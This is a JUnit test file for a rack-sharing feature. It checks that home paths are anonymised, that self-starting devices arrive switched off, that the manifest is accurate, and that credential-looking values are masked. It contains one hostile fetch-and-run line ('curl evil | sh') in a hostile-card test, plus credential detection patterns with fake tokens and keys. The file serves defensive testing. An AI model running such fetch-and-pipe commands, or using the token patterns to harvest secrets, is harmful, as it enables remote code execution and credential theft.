package org.nmox.studio.rack.model;

import java.nio.file.Path;
import java.util.Set;
import org.json.JSONArray;
import org.json.JSONObject;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * A rack shared as a file travels without naming its sender, arrives at rest,
 * and says what it holds before anything mounts (v2.176.0).
 */
class RackShareTest {

    private static final Path HOME = Path.of("/Users/sender");
    /** The sender's home as this platform spells it, with '/' — Windows makes it {@code D:/Users/sender}. */
    private static final String SENDER = HOME.toAbsolutePath().normalize().toString().replace('\\', '/');
    private static final Path RECEIVER = Path.of("/home/receiver");

    private static JSONObject patch() {
        JSONObject root = new JSONObject();
        root.put("version", 1);
        JSONArray devices = new JSONArray();
        devices.put(new JSONObject().put("type", "tail").put("state", new JSONObject()
                .put("file", SENDER + "/proj/logs/app.log").put("lines", "40")));
        devices.put(new JSONObject().put("type", "reflex").put("state", new JSONObject()
                .put("armed", "true").put("filter", "1")));
        devices.put(new JSONObject().put("type", "tempo").put("state", new JSONObject()
                .put("running", "true").put("rate", "2")));
        devices.put(new JSONObject().put("type", "cmd").put("state", new JSONObject()
                .put("command", "npm run build").put("cwd", SENDER)));
        devices.put(new JSONObject().put("type", "com.example.uptime").put("state", new JSONObject()));
        devices.put(new JSONObject().put("type", "console").put("state", new JSONObject().put("tap", "1")));
        root.put("devices", devices);
        JSONArray cables = new JSONArray();
        cables.put(new JSONObject().put("fromDevice", 1).put("fromPort", "changed").put("toDevice", 3).put("toPort", "run"));
        cables.put(new JSONObject().put("fromDevice", 3).put("fromPort", "out").put("toDevice", 5).put("toPort", "in"));
        root.put("cables", cables);
        return root;
    }

    @Test
    @DisplayName("export rewrites every path under the sender's home to ~ — a home path is a username — and names only the product version")
    void exportHidesTheSender() {
        JSONObject shared = RackShare.export(patch(), HOME, "2.176.0");
        assertThat(shared.getJSONObject(RackShare.SHARED).getString("product")).isEqualTo("2.176.0");
        assertThat(shared.getJSONObject(RackShare.SHARED).keySet())
                .as("nothing else about the sender travels").containsExactly("product");
        JSONArray devices = shared.getJSONArray("devices");
        assertThat(devices.getJSONObject(0).getJSONObject("state").getString("file"))
                .isEqualTo("~/proj/logs/app.log");
        assertThat(devices.getJSONObject(3).getJSONObject("state").getString("cwd"))
                .as("the home directory itself is ~, not ~/").isEqualTo("~");
        assertThat(devices.getJSONObject(3).getJSONObject("state").getString("command"))
                .as("everything that is not a home path travels verbatim — the commands ARE the point")
                .isEqualTo("npm run build");
        assertThat(shared.toString()).as("no trace of the sender's home").doesNotContain(SENDER);
        assertThat(patch().toString()).as("export never mutates its input").contains(SENDER);
    }

    @Test
    @DisplayName("import expands ~ to the receiver's home, sets every self-starting flag off, and drops the header so what mounts is a plain patch")
    void importArrivesAtRest() {
        JSONObject shared = RackShare.export(patch(), HOME, "2.176.0");
        JSONObject mounted = RackShare.imported(shared, RECEIVER);
        String receiver = RECEIVER.toAbsolutePath().normalize().toString();
        assertThat(mounted.has(RackShare.SHARED)).isFalse();
        JSONArray devices = mounted.getJSONArray("devices");
        assertThat(devices.getJSONObject(0).getJSONObject("state").getString("file"))
                .as("expanded with the receiver's own separator")
                .isEqualTo(RECEIVER.toAbsolutePath().normalize().resolve("proj").resolve("logs").resolve("app.log").toString());
        assertThat(devices.getJSONObject(3).getJSONObject("state").getString("cwd")).isEqualTo(receiver);
        assertThat(devices.getJSONObject(1).getJSONObject("state").getString("armed"))
                .as("a watcher saved armed must not start watching because a file was opened").isEqualTo("false");
        assertThat(devices.getJSONObject(2).getJSONObject("state").getString("running"))
                .as("a clock saved running must not start firing triggers into whatever it was cabled to").isEqualTo("false");
        assertThat(devices.getJSONObject(1).getJSONObject("state").getString("filter"))
                .as("only the self-starting flags change").isEqualTo("1");
        assertThat(mounted.getJSONArray("cables")).hasSize(2);
    }

    @Test
    @DisplayName("the manifest names every device, marks the ones this install lacks, counts cables and arrivals at rest, and lists the settings worth reading")
    void manifestSaysWhatIsInside() {
        JSONObject shared = RackShare.export(patch(), HOME, "2.176.0");
        Set<String> known = Set.of("tail", "reflex", "tempo", "cmd", "console");
        RackShare.Manifest m = RackShare.inspect(shared, known::contains);
        assertThat(m.devices()).extracting(RackShare.Device::typeId)
                .containsExactly("tail", "reflex", "tempo", "cmd", "com.example.uptime", "console");
        assertThat(m.unknownTypes()).as("a plugin device this install does not have mounts as a placeholder — say so first")
                .containsExactly("com.example.uptime");
        assertThat(m.complete()).isFalse();
        assertThat(m.cables()).isEqualTo(2);
        assertThat(m.atRest()).as("two devices were saved armed/running").isEqualTo(2);
        assertThat(m.sharedBy()).isEqualTo("2.176.0");
        assertThat(m.settings()).extracting(RackShare.Setting::value)
                .as("commands and paths are shown; knob positions and switches are not")
                .containsExactlyInAnyOrder("~/proj/logs/app.log", "npm run build", "~");
    }

    @Test
    @DisplayName("a device entry that is not an object is refused by its slot from inspect, imported and export alike — never org.json's own exception; a header alone is an empty manifest")
    void hostileDeviceEntryIsRefusedByName() {
        JSONObject hostile = new JSONObject("{\"shared\":{},\"devices\":[{\"type\":\"tempo\",\"state\":{}},1]}");
        for (String door : java.util.List.of("inspect", "imported", "export")) {
            Throwable t = org.assertj.core.api.Assertions.catchThrowable(() -> {
                switch (door) {
                    case "inspect" -> RackShare.inspect(hostile, id -> true);
                    case "imported" -> RackShare.imported(hostile, RECEIVER);
                    default -> RackShare.export(hostile, HOME, "2.176.0");
                }
            });
            assertThat(t).as(door + " refuses").isInstanceOf(IllegalArgumentException.class);
            assertThat(t.getMessage()).as(door + " names the slot").contains("devices[1]");
        }
        JSONObject noDevices = new JSONObject("{\"shared\":{}}");
        assertThat(RackShare.inspect(noDevices, id -> true).devices()).as("a header alone is an empty manifest").isEmpty();
        assertThat(RackShare.imported(noDevices, RECEIVER).has("shared")).isFalse();
    }

    @Test
    @DisplayName("a plain Save Patch file is not a shared one, and inspecting it still works")
    void plainPatchIsNotShared() {
        assertThat(RackShare.isShared(patch())).isFalse();
        assertThat(RackShare.isShared(RackShare.export(patch(), HOME, "x"))).isTrue();
        RackShare.Manifest m = RackShare.inspect(patch(), t -> true);
        assertThat(m.sharedBy()).isNull();
        assertThat(m.unknownTypes()).isEmpty();
    }

    @Test
    @DisplayName("worth reading: a command, a path or an address; not a number, a switch or a short word")
    void worthReading() {
        assertThat(RackShare.worthReading("npm run build")).isTrue();
        assertThat(RackShare.worthReading("/var/log/app.log")).isTrue();
        assertThat(RackShare.worthReading("C:\\Users\\x")).isTrue();
        assertThat(RackShare.worthReading("http://localhost:3000/health")).isTrue();
        assertThat(RackShare.worthReading("~/proj")).isTrue();
        assertThat(RackShare.worthReading("2")).isFalse();
        assertThat(RackShare.worthReading("-1.5")).isFalse();
        assertThat(RackShare.worthReading("false")).isFalse();
        assertThat(RackShare.worthReading("pytest")).isFalse();
        assertThat(RackShare.worthReading("")).isFalse();
        assertThat(RackShare.worthReading(null)).isFalse();
    }

    @Test
    @DisplayName("a home elsewhere on the path is not the sender's home: only the prefix is rewritten")
    void onlyThePrefixIsHome() {
        JSONObject root = new JSONObject().put("version", 1)
                .put("devices", new JSONArray().put(new JSONObject().put("type", "tail").put("state",
                        new JSONObject().put("file", "/srv" + SENDER + "/x").put("note", SENDER + "ling/y"))))
                .put("cables", new JSONArray());
        JSONObject shared = RackShare.export(root, HOME, "x");
        JSONObject state = shared.getJSONArray("devices").getJSONObject(0).getJSONObject("state");
        assertThat(state.getString("file")).isEqualTo("/srv" + SENDER + "/x");
        assertThat(state.getString("note")).as("/Users/senderling is another user").isEqualTo(SENDER + "ling/y");
    }

    // ---- v2.179.0: the home inside a command, the sender's audit, the card ----

    private static final String RECEIVER_ABS = RECEIVER.toAbsolutePath().normalize().toString();
    private static final String SEP = java.io.File.separator;

    /** The three built-ins whose switches start something, as a pure function — no catalog in a model test. */
    private static Set<String> selfStarting(String typeId) {
        return switch (typeId) {
            case "reflex" -> Set.of("armed");
            case "tempo" -> Set.of("running");
            case "tail" -> Set.of("follow");
            default -> typeId.contains(".") ? RackShare.EVERY_SWITCH : Set.of();
        };
    }

    private static JSONObject oneCommand(String command) {
        return new JSONObject().put("version", 1)
                .put("devices", new JSONArray().put(new JSONObject().put("type", "cmd")
                        .put("state", new JSONObject().put("command", command))))
                .put("cables", new JSONArray());
    }

    private static String commandOf(JSONObject doc) {
        return doc.getJSONArray("devices").getJSONObject(0).getJSONObject("state").getString("command");
    }

    private static String exportedCommand(String command) {
        JSONObject shared = RackShare.export(oneCommand(command), HOME, "x");
        assertThat(shared.toString()).as("no trace of the sender in: " + command).doesNotContain(SENDER);
        return commandOf(shared);
    }

    private static String importedCommand(String command) {
        JSONObject shared = oneCommand(command).put(RackShare.SHARED, new JSONObject());
        return commandOf(RackShare.imported(shared, RECEIVER, RackShareTest::selfStarting));
    }

    @Test
    @DisplayName("a home path INSIDE a command is a username too: tail -f /Users/sender/logs/app.log leaves as tail -f ~/logs/app.log")
    void embeddedHomeIsHidden() {
        assertThat(exportedCommand("tail -f " + SENDER + "/logs/app.log")).isEqualTo("tail -f ~/logs/app.log");
        assertThat(exportedCommand("ssh -i " + SENDER + "/.ssh/key deploy@host")).isEqualTo("ssh -i ~/.ssh/key deploy@host");
    }

    @Test
    @DisplayName("every occurrence is rewritten, not the first: two paths in one command")
    void twoEmbeddedHomes() {
        assertThat(exportedCommand("diff " + SENDER + "/a.txt " + SENDER + "/b/c.txt")).isEqualTo("diff ~/a.txt ~/b/c.txt");
        assertThat(exportedCommand(SENDER + "/bin/tool --out " + SENDER)).isEqualTo("~/bin/tool --out ~");
    }

    @Test
    @DisplayName("a quoted path keeps its quotes and its spaces, and the text after the closing quote is not part of it")
    void quotedEmbeddedHome() {
        assertThat(exportedCommand("cat \"" + SENDER + "/My Docs/x.log\" --tail")).isEqualTo("cat \"~/My Docs/x.log\" --tail");
        assertThat(exportedCommand("cat '" + SENDER + "' x")).isEqualTo("cat '~' x");
    }

    @Test
    @DisplayName("KEY=/Users/sender/x is a path after an equals sign")
    void homeAfterEquals() {
        assertThat(exportedCommand("LOG=" + SENDER + "/x npm start")).isEqualTo("LOG=~/x npm start");
        assertThat(exportedCommand("tool --config=" + SENDER + "/.toolrc")).isEqualTo("tool --config=~/.toolrc");
    }

    @Test
    @DisplayName("a remote path is not the sender's disk: host:/Users/sender/dir and host:~/dir are untouched in both directions, while the local half of the same command is rewritten")
    void remotePathsAreLeftAlone() {
        assertThat(commandOf(RackShare.export(oneCommand("scp x host:" + SENDER + "/dir"), HOME, "x")))
                .isEqualTo("scp x host:" + SENDER + "/dir");
        assertThat(commandOf(RackShare.export(oneCommand("rsync -a " + SENDER + "/src host:" + SENDER + "/dst"), HOME, "x")))
                .isEqualTo("rsync -a ~/src host:" + SENDER + "/dst");
        assertThat(importedCommand("scp x host:~/dir")).isEqualTo("scp x host:~/dir");
        assertThat(importedCommand("rsync -a ~/src host:~/dst"))
                .isEqualTo("rsync -a " + RECEIVER_ABS + SEP + "src host:~/dst");
    }

    @Test
    @DisplayName("a URL tilde is somebody's web directory, not a home: http://host/~user/ is untouched in both directions")
    void urlTildeIsLeftAlone() {
        assertThat(exportedCommand("curl http://host/~sender/index.html")).isEqualTo("curl http://host/~sender/index.html");
        assertThat(importedCommand("curl http://host/~user/")).isEqualTo("curl http://host/~user/");
        assertThat(importedCommand("open http://host/~/x")).isEqualTo("open http://host/~/x");
        assertThat(importedCommand("echo a~b ~user")).as("a tilde inside a word, or before a name, is not home").isEqualTo("echo a~b ~user");
    }

    @Test
    @DisplayName("round trip onto a different home: what left as ~ arrives as the receiver's own path, inside commands and quotes too")
    void roundTripOntoAnotherHome() {
        String sent = "tail -f " + SENDER + "/logs/app.log | tee \"" + SENDER + "/My Docs/out.log\" LOG=" + SENDER;
        JSONObject shared = RackShare.export(oneCommand(sent), HOME, "x");
        assertThat(commandOf(RackShare.imported(shared, RECEIVER, RackShareTest::selfStarting)))
                .isEqualTo("tail -f " + RECEIVER_ABS + SEP + "logs" + SEP + "app.log | tee \""
                        + RECEIVER_ABS + SEP + "My Docs" + SEP + "out.log\" LOG=" + RECEIVER_ABS);
    }

    @Test
    @DisplayName("the value that is exactly the home is ~, the home with a trailing separator is ~/, and /Users/senderling is another user wherever it stands")
    void exactHomeAndTheNeighbour() {
        assertThat(exportedCommand(SENDER)).isEqualTo("~");
        assertThat(exportedCommand(SENDER + "/")).isEqualTo("~/");
        assertThat(commandOf(RackShare.export(oneCommand("ls " + SENDER + "ling/y " + SENDER + "-old"), HOME, "x")))
                .isEqualTo("ls " + SENDER + "ling/y " + SENDER + "-old");
    }

    @Test
    @DisplayName("a Windows home matches either separator and any case, and only the path token is re-spelled — a regex argument keeps its backslashes")
    void windowsSpellings() {
        String home = "C:/Users/sender";
        assertThat(RackShare.hideHome("tail -f C:\\Users\\sender\\logs\\app.log", home)).isEqualTo("tail -f ~/logs/app.log");
        assertThat(RackShare.hideHome("type c:\\users\\SENDER\\x.txt", home)).isEqualTo("type ~/x.txt");
        assertThat(RackShare.hideHome("findstr \"a\\|b\" C:\\Users\\sender\\x", home)).isEqualTo("findstr \"a\\|b\" ~/x");
        assertThat(RackShare.hideHome("dir C:\\Users\\senderling", home)).isEqualTo("dir C:\\Users\\senderling");
        assertThat(RackShare.hideHome("copy x host:C:/Users/sender/y", home)).isEqualTo("copy x host:C:/Users/sender/y");
        assertThat(RackShare.expandHome("type ~/logs/app.log \"~/My Docs/x\"", "C:\\Users\\r", '\\'))
                .isEqualTo("type C:\\Users\\r\\logs\\app.log \"C:\\Users\\r\\My Docs\\x\"");
        assertThat(RackShare.hideHome("/x", "/")).as("a root 'home' names nobody and rewrites nothing").isEqualTo("/x");
    }

    @Test
    @DisplayName("the resolver decides which switches arrive off: a named key always, EVERY_SWITCH anything reading true, and no answer is the conservative one")
    void resolverDecidesWhatArrivesOff() {
        JSONObject shared = new JSONObject().put(RackShare.SHARED, new JSONObject()).put("devices", new JSONArray()
                .put(new JSONObject().put("type", "tail").put("state", new JSONObject().put("follow", "true").put("path", "~/x.log")))
                .put(new JSONObject().put("type", "terminal").put("state", new JSONObject().put("follow", "true")))
                .put(new JSONObject().put("type", "com.example.p").put("state", new JSONObject().put("on", "true").put("a", "true"))));
        JSONArray mounted = RackShare.imported(shared, RECEIVER, RackShareTest::selfStarting).getJSONArray("devices");
        assertThat(mounted.getJSONObject(0).getJSONObject("state").getString("follow"))
                .as("TAIL's follow starts a poll of a path the sender chose").isEqualTo("false");
        assertThat(mounted.getJSONObject(1).getJSONObject("state").getString("follow"))
                .as("the same KEY on another device is a setting: the rule is per type, not per name").isEqualTo("true");
        assertThat(mounted.getJSONObject(2).getJSONObject("state").getString("on")).isEqualTo("false");
        assertThat(RackShare.inspect(shared, t -> true, RackShareTest::selfStarting).atRest())
                .as("devices, not switches: the plugin with two counts once").isEqualTo(2);
        assertThat(RackShare.inspect(shared, t -> true, t -> null).atRest())
                .as("a resolver with no answer means every switch").isEqualTo(3);
        assertThat(RackShare.imported(shared, RECEIVER, null).getJSONArray("devices").getJSONObject(1)
                .getJSONObject("state").getString("follow")).isEqualTo("false");
    }

    @Test
    @DisplayName("the resolver is asked only about a device that has a switch saved ON — asking builds the device, and a manifest should not build a rack to be read")
    void resolverIsAskedOnlyWhenASwitchIsOn() {
        java.util.List<String> asked = new java.util.ArrayList<>();
        java.util.function.Function<String, Set<String>> counting = type -> {
            asked.add(type);
            return selfStarting(type);
        };
        JSONObject shared = RackShare.export(patch(), HOME, "x");
        RackShare.inspect(shared, t -> true, counting);
        assertThat(asked).as("patch() saves exactly two switches on: reflex.armed and tempo.running")
                .containsExactly("reflex", "tempo");
        asked.clear();
        RackShare.imported(shared, RECEIVER, counting);
        assertThat(asked).containsExactly("reflex", "tempo");
        JSONObject quiet = new JSONObject().put("devices", new JSONArray().put(new JSONObject().put("type", "tail")
                .put("state", new JSONObject().put("follow", "false").put("path", "~/x.log"))));
        asked.clear();
        assertThat(RackShare.inspect(quiet, t -> true, counting).atRest()).isZero();
        assertThat(asked).as("a switch saved off is already at rest").isEmpty();
    }

    // ---- the audit ----

    private static final java.util.Map<String, java.util.function.Predicate<String>> DETECTORS = new java.util.LinkedHashMap<>();

    static {
        DETECTORS.put("bearer", RackShare::hasBearer);
        DETECTORS.put("assignment", RackShare::hasSecretAssignment);
        DETECTORS.put("apiKey", RackShare::hasApiKey);
        DETECTORS.put("tokenPrefix", RackShare::hasTokenPrefix);
        DETECTORS.put("awsKeyId", RackShare::hasAwsKeyId);
        DETECTORS.put("privateKey", RackShare::hasPrivateKey);
    }

    private static void onlyFlaggedBy(String detector, String... values) {
        for (String value : values) {
            for (var d : DETECTORS.entrySet()) {
                assertThat(d.getValue().test(value)).as(d.getKey() + " on: " + value).isEqualTo(d.getKey().equals(detector));
            }
            assertThat(RackShare.looksSecret(value)).as("looksSecret: " + value).isTrue();
        }
    }

    @Test
    @DisplayName("each credential detector alone: inputs only it flags")
    void eachSecretDetectorAlone() {
        onlyFlaggedBy("bearer", "curl -H \"Authorization: Bearer abc123def\" http://x", "auth: bearer 0a1b2c");
        onlyFlaggedBy("assignment", "mysql --password=hunter2 db", "psql \"host=x passwd=abc\"", "deploy --token=abc123", "PASSWORD=x");
        onlyFlaggedBy("apiKey", "curl -d api_key=abc http://x", "X-Api-Key: abc", "{\"apikey\": \"abc\"}", "--api-key = abc");
        onlyFlaggedBy("tokenPrefix", "sk-abcdefghijklmnop1234", "GH=ghp_abcdefgh12345678", "gho_abcdefgh12345678",
                "github_pat_11ABCDEFG0abcdefgh", "slack xoxb-1234567890-abcdefgh", "xoxp-1234567890-abcdefgh");
        onlyFlaggedBy("awsKeyId", "aws --key AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE");
        onlyFlaggedBy("privateKey", "-----BEGIN RSA PRIVATE KEY-----\nMIIEow", "echo '-----BEGIN PRIVATE KEY-----'");
    }

    @Test
    @DisplayName("ordinary rack values are not credentials: a build command, a local URL, a token FILE flag, and words that merely contain a prefix")
    void cleanValuesDoNotFlag() {
        for (String clean : new String[]{"npm run build", "http://localhost:3000", "--token-file ./t",
                "task-runner --fast", "pip install sk-learn", "risk-assessment-tool-long-name",
                "AKIAIOSFODNN7EXAMPLEX", "xAKIAIOSFODNN7EXAMPLE", "AKIAshort", "bearer", "Bearer  ",
                "api_key_rotation.md", "-----BEGIN CERTIFICATE-----", "cargo test", "~/proj/logs/app.log", ""}) {
            assertThat(RackShare.looksSecret(clean)).as("not a secret: " + clean).isFalse();
        }
        assertThat(RackShare.looksSecret(null)).isFalse();
    }

    @Test
    @DisplayName("the audit never becomes a second copy of the secret: a secret-looking value is masked to four characters in EVERY list it appears in")
    void auditMasksSecrets() {
        JSONObject doc = new JSONObject().put("devices", new JSONArray()
                .put(new JSONObject().put("type", "cmd").put("state", new JSONObject()
                        .put("command", "curl -H \"Authorization: Bearer supersecrettoken99\" /Users/alice/x")))
                .put(new JSONObject().put("type", "env").put("state", new JSONObject()
                        .put("key", "sk-abcdefghijklmnop1234").put("nodeEnv", "1")))
                .put(new JSONObject().put("type", "cmd").put("state", new JSONObject().put("command", "npm run build"))));
        RackShare.Audit audit = RackShare.audit(doc);
        assertThat(audit.secretLooking()).extracting(RackShare.Setting::value).containsExactly("curl\u2026", "sk-a\u2026");
        assertThat(audit.settings()).extracting(RackShare.Setting::value)
                .as("the same list the receiver is shown — with the secret masked").containsExactly("curl\u2026", "npm run build");
        assertThat(audit.personalPaths()).extracting(RackShare.Setting::value).containsExactly("curl\u2026");
        assertThat(audit.personalPaths().get(0).key()).as("the field is still findable").isEqualTo("command");
        assertThat(audit.toString()).doesNotContain("supersecrettoken99").doesNotContain("abcdefghijklmnop").doesNotContain("alice");
        assertThat(audit.clean()).isFalse();
        assertThat(RackShare.masked("ab")).isEqualTo("ab\u2026");
        assertThat(RackShare.masked("\uD83D\uDD11\uD83D\uDD11\uD83D\uDD11\uD83D\uDD11\uD83D\uDD11"))
                .as("four code points, never half a surrogate pair").isEqualTo("\uD83D\uDD11\uD83D\uDD11\uD83D\uDD11\uD83D\uDD11\u2026");
    }

    @Test
    @DisplayName("personal paths: a home that survived the rewrite — another user's, another platform's, a remote one — is shown to the sender; ~ and shared directories are not")
    void auditFindsHomesThatSurvived() {
        for (String personal : new String[]{"/Users/alice/x", "tail -f /home/bob/app.log", "C:\\Users\\carol\\x",
                "type c:/users/dave", "LOG=/home/erin", "cat \"/Users/frank/My Docs\"", "copy x host:/home/gina/dst", "/home/h",
                "file:///Users/ivy/site/index.html", "open(/home/jo/x)", "copy x host:C:\\Users\\kim\\y"}) {
            assertThat(RackShare.namesAHome(personal)).as("names somebody: " + personal).isTrue();
        }
        for (String fine : new String[]{"~/x", "tail -f ~/logs/app.log", "/Users/Shared/tools", "C:\\Users\\Public\\x",
                "C:/Users/Public/x", "/srv/Users/x", "/usr/home/x", "~/home/site", "/Users/", "/home", "/var/log/app.log",
                "http://localhost/Users/x", "xC:\\Users\\lee", ""}) {
            assertThat(RackShare.namesAHome(fine)).as("names nobody: " + fine).isFalse();
        }
        assertThat(RackShare.namesAHome(null)).isFalse();
        RackShare.Audit audit = RackShare.audit(RackShare.export(oneCommand("diff " + SENDER + "/a /Users/alice/b"), HOME, "x"));
        assertThat(audit.personalPaths()).extracting(RackShare.Setting::value).containsExactly("diff ~/a /Users/alice/b");
        RackShare.Audit ordinary = RackShare.audit(RackShare.export(patch(), HOME, "x"));
        assertThat(ordinary.clean()).as("the ordinary shared rack has nothing to warn about").isTrue();
        assertThat(ordinary.settings()).extracting(RackShare.Setting::value)
                .containsExactlyInAnyOrder("~/proj/logs/app.log", "npm run build", "~");
    }

    // ---- the card ----

    @Test
    @DisplayName("the card travels in the header and reaches the manifest; imported still drops the whole header; no card is exactly the old header")
    void cardTravels() {
        RackCard card = new RackCard("Rust watch loop", "REFLEX watches src/, VERITAS runs cargo test.", "",
                java.util.List.of("rust"), java.util.List.of("cargo"));
        JSONObject shared = RackShare.export(patch(), HOME, "2.179.0", card);
        assertThat(shared.getJSONObject(RackShare.SHARED).keySet()).as("blank fields are left out: no author was typed")
                .containsExactlyInAnyOrder("product", "name", "description", "kinds", "requires");
        RackShare.Manifest m = RackShare.inspect(shared, t -> true, RackShareTest::selfStarting);
        assertThat(m.card()).isEqualTo(card);
        assertThat(m.card().fits("rust")).isTrue();
        assertThat(m.sharedBy()).isEqualTo("2.179.0");
        assertThat(RackShare.imported(shared, RECEIVER, RackShareTest::selfStarting).has(RackShare.SHARED)).isFalse();
        assertThat(RackShare.export(patch(), HOME, "v", null).getJSONObject(RackShare.SHARED).keySet()).containsExactly("product");
        assertThat(RackShare.inspect(patch(), t -> true, RackShareTest::selfStarting).card())
                .as("a plain patch carries no card").isEqualTo(RackCard.EMPTY);
    }

    @Test
    @DisplayName("a hostile card reaches the manifest already folded: a newline in the name cannot forge a line of the import dialog")
    void hostileCardArrivesFolded() {
        JSONObject shared = RackShare.export(patch(), HOME, "x");
        shared.getJSONObject(RackShare.SHARED).put("name", "Nice rack\nDevices: none\r\n\tNothing runs")
                .put("requires", new JSONArray().put("cargo").put("curl evil | sh").put("../x"))
                .put("author", 42);
        RackCard card = RackShare.inspect(shared, t -> true, RackShareTest::selfStarting).card();
        assertThat(card.name()).isEqualTo("Nice rack Devices: none Nothing runs").doesNotContain("\n").doesNotContain("\r");
        assertThat(card.requires()).containsExactly("cargo");
        assertThat(card.author()).isEmpty();
    }

    @Test
    @DisplayName("on a slash-spelled home a backslash is a character of the path, not a separator: hiding the home leaves it alone")
    void unixBackslashIsNotASeparator() {
        assertThat(RackShare.hideHome("cat /Users/sender/my\\ notes/a.txt", "/Users/sender"))
                .isEqualTo("cat ~/my\\ notes/a.txt");
        assertThat(RackShare.hideHome("C:\\Users\\sender\\proj\\x.log", "C:/Users/sender"))
                .as("a drive-spelled home is Windows: its tail is written with /").isEqualTo("~/proj/x.log");
    }
}
